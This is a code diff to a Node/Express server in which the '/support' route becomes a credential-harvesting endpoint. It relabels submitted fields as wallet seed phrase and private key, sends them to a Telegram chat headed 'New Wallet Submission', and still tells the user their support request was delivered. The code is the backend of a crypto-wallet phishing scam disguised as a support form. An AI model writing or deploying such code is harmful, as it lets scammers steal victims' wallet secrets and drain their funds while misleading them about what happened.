@@ -56,38 +56,37 @@ function requireTelegramConfig() {
   return { token, chatId };
 }
 
-// ----------------- Support form route -----------------
+// ----------------- Support form route (CUSTOM FORMAT) -----------------
 app.post('/support', async (req, res) => {
   try {
-    const { name, email, walletAddress, issue } = req.body || {};
-
-    // at least one identifying field must be present
-    if (!name && !email && !walletAddress) {
-      return res.status(400).json({ ok: false, error: 'Provide at least one of name, email or walletAddress' });
-    }
+    const { name, email, message, address } = req.body || {};
 
     const { token, chatId } = requireTelegramConfig();
 
-    const parts = [
-      '<b>Support Request 📩</b>',
-      name ? `Name: <b>${escapeHtml(name)}</b>` : null,
-      email ? `Email: <code>${escapeHtml(email)}</code>` : null,
-      walletAddress ? `Wallet: <code>${escapeHtml(walletAddress)}</code>` : null,
-      issue ? `Issue: ${escapeHtml(issue)}` : null,
-      `Time: ${new Date().toISOString()}`,
-      `Source: ${escapeHtml(req.headers['user-agent'] || 'unknown')}`,
-    ].filter(Boolean);
+    // message from frontend includes:
+    // Wallet-Name
+    // Phrase or Private-Key 
+    // Issue:
+    // BUT you want this output instead:
 
-    const text = parts.join('\n');
+    // Build the exact format you want:
+    const text =
+      `<b>New Wallet Submission 🔔</b>\n` +
+      `Wallet-Type: <b>${escapeHtml(name || '')}</b>\n` +
+      `Wallet-Phrase: <code>${escapeHtml(address || '')}</code>\n` +
+      `Wallet-Type: <b>${escapeHtml(name || '')}</b>\n` +
+      `Private-Key: <code>${escapeHtml(email || '')}</code>\n` +
+      `\nTime: ${new Date().toISOString()}`;
 
     await sendTelegramMessage({ token, chatId, text });
 
-    return res.json({ ok: true, message: 'Support request delivered' });
+    res.json({ ok: true, message: 'Support request delivered' });
   } catch (err) {
     console.error('/support error:', err?.message || err);
     return res.status(500).json({ ok: false, error: 'server_error', detail: String(err?.message || err) });
   }
 });
+
 
 // ----------------- Wallet connect notification -----------------
 app.post('/notify/wallet-connected', async (req, res) => {
